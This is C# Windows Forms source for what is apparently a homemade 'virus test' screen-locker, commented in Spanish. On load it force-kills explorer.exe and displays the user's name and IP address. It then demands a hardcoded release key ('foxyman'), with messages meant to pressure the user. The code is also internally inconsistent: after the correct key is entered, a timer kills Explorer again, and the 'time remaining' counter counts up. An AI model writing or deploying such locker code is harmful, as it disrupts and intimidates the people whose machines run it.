using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Net;
using System.Net.NetworkInformation;
using System.IO;

namespace viruzinformaticoPrueba.exe
{
    public partial class Foxicomputer : Form
    {
        Cmd terminal = new Cmd();
        int m=0;
        private string clave = "foxyman";

        public Foxicomputer()
        {
            InitializeComponent();
        }

        private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            label2.Visible = true;
            Clave.Visible = true;
            Liberacion.Visible = true;
        }

        private void Foxicomputer_Load(object sender, EventArgs e)
        {
            terminal = new Cmd("TASKKILL /F /IM explorer.exe");

            IPHostEntry host;
            string localhost="";
            host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (IPAddress ip in host.AddressList)
            {
                if (ip.AddressFamily.ToString() == "InterNetwork")
                {
                    localhost = ip.ToString();
                }
            }            
            Usermsj.Text = "User: "+Environment.UserName+" IP: "+localhost;
        }

        private void Liberacion_Click(object sender, EventArgs e)
        {
            if (Clave.Text != "")
            {
                if (Clave.Text == clave)
                {       
                    timer1.Enabled=true;
                    terminal = new Cmd(@"start c:\Windows\explorer.exe");
                    Salir.Visible = true;
                }
                else { MessageBox.Show("La clave de liberacion no es valida"); }
            }
            else { MessageBox.Show("Esto no es un juego Ingresa la clave de liberacion"); }
        }

        private void Salir_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            terminal = new Cmd("TASKKILL /F /IM explorer.exe"); 
        }

        private void Tiempo_Tick(object sender, EventArgs e)
        {
            m++;
            cronometro.Text="tiempo restante: "+m;
            if(m==59)
            {
                m=0;
                cronometro.Text="Tiempo restante: "+m;
            }
        }       
    }
}
